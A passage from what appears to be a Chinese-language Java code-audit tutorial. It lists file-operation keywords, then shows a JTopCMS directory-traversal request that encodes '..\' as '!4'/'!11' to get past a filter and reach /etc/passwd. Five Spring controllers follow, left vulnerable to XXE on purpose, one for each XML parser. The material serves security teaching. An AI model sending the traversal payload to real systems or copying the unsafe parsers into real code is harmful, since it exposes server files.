<li>java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem</li>
<li>sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider</li>
<li>java.io.RandomAccessFile</li>
<li>sun.nio.fs.CopyFile</li>
<li>sun.nio.fs.UnixChannelFactory</li>
<li>sun.nio.fs.WindowsChannelFactory</li>
<li>java.nio.channels.AsynchronousFileChannel</li>
<li>FileUtil/IOUtil</li>
<li>BufferedReader</li>
<li>readAllBytes</li>
<li>scanner</li>
</ul>
<p>上面是给出的文件操作类关键字，这些关键字不仅仅能定位到文件读取或下载操作，还会涉及到一些比<br>如文件删除，文件移动，文件遍历等操作。<br>总之上面通过关键字定位到文件操作类功能时，大家都可以进一步审计，也许还会存在任意文件删除，<br>任意文件遍历，任意文件移动等漏洞。换汤不换药，后面实战中遇到再进一步讲解吧。</p>
<h2 id="Jtopcms目录穿越"><a href="#Jtopcms目录穿越" class="headerlink" title="Jtopcms目录穿越"></a>Jtopcms目录穿越</h2><p>数据包</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/resources/downloadResFile.do?entry=*template*img**!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11****!4****!11**etc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>90</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:8080</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:8080//core/templet/ManageTemplate.jsp?parentFolder=*template*img</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=CF79A6652024C7923DBB3202ACC39ED5; webfx-tree-cookie-persistence=10644+10645+10648+10657+-9999</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>iframe</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"></span><br><span class="line">downFileInfo=passwd&amp;_sys_jtop_token_key_=148*1832718297ff8081818a16e239965018a172ab63000d1</span><br></pre></td></tr></table></figure>

<p>过滤：</p>
<p>在ResourcesService.java的getFullFilePathByManager函数中，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>( ( endEntry.indexOf( <span class="string">&quot;../&quot;</span> ) != -<span class="number">1</span> ) || ( endEntry.indexOf( <span class="string">&quot;..%2F&quot;</span> ) != -<span class="number">1</span> )|| ( endEntry.indexOf( <span class="string">&quot;..%2f&quot;</span> ) != -<span class="number">1</span> ) || ( endEntry.indexOf( <span class="string">&quot;WEB-INF&quot;</span> ) != -<span class="number">1</span> ) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230821165419174.png" alt="image-20230821165419174"></p>
<p>会过滤../、..%2F、..%2f、WEB-INF</p>
<p>突破点</p>
<p>在SystemSafeCharUtil.java中，有一组字符替换的函数decodeDangerChar</p>
<p><img src="image-20230821170343550.png" alt="image-20230821170343550"></p>
<p>其中会把**!4**替换为..，把**!11**替换为\，在<strong>win</strong>环境下，是可以用..\来跳到上层目录的所以上面数据包的在经过一系列处理后，就变成了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;this_is_y&#x2F;Code_Audit&#x2F;Web&#x2F;JTopCMSV3-JTopCMSV3.0.2-OP&#x2F;target&#x2F;ROOT&#x2F;demo&#x2F;template&#x2F;img\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><del>当然，因为我这里是linux环境，所以复现不了</del> </p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>五种解析方式</p>
<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>DOM的全称是Document Object Model，也即文档对象模型。DOM 解析是将一个 XML 文档转换成一<br>个 DOM 树，并将 DOM 树放在内存中。<br>使用大致步骤：</p>
<ol>
<li>创建一个 DocumentBuilderFactory 对象</li>
<li>创建一个 DocumentBuilder 对象</li>
<li>通过 DocumentBuilder 的 parse() 方法加载 XML</li>
<li>遍历 name 和 value 节点</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xxedemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/domdemo/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">domDemo</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取输入流</span></span><br><span class="line">            InputStream in = request.getInputStream();</span><br><span class="line">            String body = convertStreamToString(in);</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            Document document = db.parse(is);</span><br><span class="line"><span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuilder buf = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(String.format(<span class="string">&quot;%s: %s\n&quot;</span>, node.getNodeName(),</span><br><span class="line">                            node.getTextContent()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;EXCEPT ERROR!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">convertStreamToString</span><span class="params">(java.io.InputStream is)</span> </span>&#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SAX"><a href="#SAX" class="headerlink" title="SAX"></a>SAX</h2><p>SAX 的全称是 Simple APIs for XML，也即 XML 简单应用程序接口。与 DOM 不同，SAX 提供的访问模<br>式是一种顺序模式，这是一种快速读写 XML 数据的方式。<br>使用大致步骤：</p>
<ol>
<li>获取 SAXParserFactory 的实例</li>
<li>获取 SAXParser 实例</li>
<li>创建一个 handler() 对象</li>
<li>通过 parser 的 parse() 方法来解析XML</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xxedemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.resolver.readers.SAXParserHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParser;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParserFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SAXTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/saxdemo/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">saxDemo</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//获取输入流</span></span><br><span class="line">        InputStream in = request.getInputStream();</span><br><span class="line">        String body = convertStreamToString(in);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser parser = spf.newSAXParser();</span><br><span class="line">            SAXParserHandler handler = <span class="keyword">new</span> SAXParserHandler();</span><br><span class="line"><span class="comment">//解析xml</span></span><br><span class="line">            parser.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)), handler);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Sax xxe vuln code&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error......&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">convertStreamToString</span><span class="params">(java.io.InputStream is)</span> </span>&#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="JDOM"><a href="#JDOM" class="headerlink" title="JDOM"></a>JDOM</h2><p>JDOM 是一个开源项目，它基于树型结构，利用纯 JAVA 的技术对 XML 文档实现解析、生成、序列化以<br>及多种操作。<br>使用大致步骤：</p>
<ol>
<li>创建一个 SAXBuilder 的对象(和上面那个sax不一样)</li>
<li>通过 saxBuilder 的 build() 方法，将输入流加载到 saxBuilder 中</li>
<li>使用 JDOM 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jdom<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdom<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xxedemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.jdom.input.SAXBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDOMTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jdomdemo/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">jdomDemo</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">//获取输入流</span></span><br><span class="line">        InputStream in = request.getInputStream();</span><br><span class="line">        String body = convertStreamToString(in);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXBuilder builder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">            builder.build(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jdom xxe vuln code&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error......&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">convertStreamToString</span><span class="params">(java.io.InputStream is)</span> </span>&#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="DOM4J"><a href="#DOM4J" class="headerlink" title="DOM4J"></a>DOM4J</h2><p>Dom4j 是一个易用的、开源的库，用于XML，XPath 和 XSLT。它应用于Java平台，采用了Java集合框架<br>并完全支持 DOM，SAX 和 JAXP。是 Jdom 的升级品<br>使用大致步骤：</p>
<ol>
<li>创建 SAXReader 的对象 reader</li>
<li>通过 reader 对象的 read() 方法加载 xml 文件<br> 使用 JDOM 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>dom4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dom4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xxedemo;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.SAXReader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOM4JTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/dom4jdemo/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">dom4jDemo</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取输入流</span></span><br><span class="line">            InputStream in = request.getInputStream();</span><br><span class="line">            String body = convertStreamToString(in);</span><br><span class="line">            SAXReader reader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">            reader.read(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;DOM4J XXE......&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;EXCEPT ERROR!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">convertStreamToString</span><span class="params">(java.io.InputStream is)</span> </span>&#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="Digester"><a href="#Digester" class="headerlink" title="Digester"></a>Digester</h2><p>Digester 是 Apache 下一款开源项目。 目前最新版本为 Digester 3.x 。<br>Digester 是对 SAX 的包装，底层是采用的是 SAX 解析方式。<br>使用大致步骤：</p>
<ol>
<li>创建 Digester 对象</li>
<li>调用 Digester 对象的 parse() 解析 XML</li>
</ol>
<p>使用 Digester 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-digester<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-digester<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xxedemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.digester.Digester;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.SAXReader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DigesterTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/digesterdemo/vul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">digesterDemo</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取输入流</span></span><br><span class="line">            InputStream in = request.getInputStream();</span><br><span class="line">            String body = convertStreamToString(in);</span><br><span class="line">            Digester digester = <span class="keyword">new</span> Digester();</span><br><span class="line">            digester.parse(<span class="keyword">new</span> StringReader(body));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Digester XXE......&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;EXCEPT ERROR!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">convertStreamToString</span><span class="params">(java.io.InputStream is)</span> </span>&#123;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(is).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





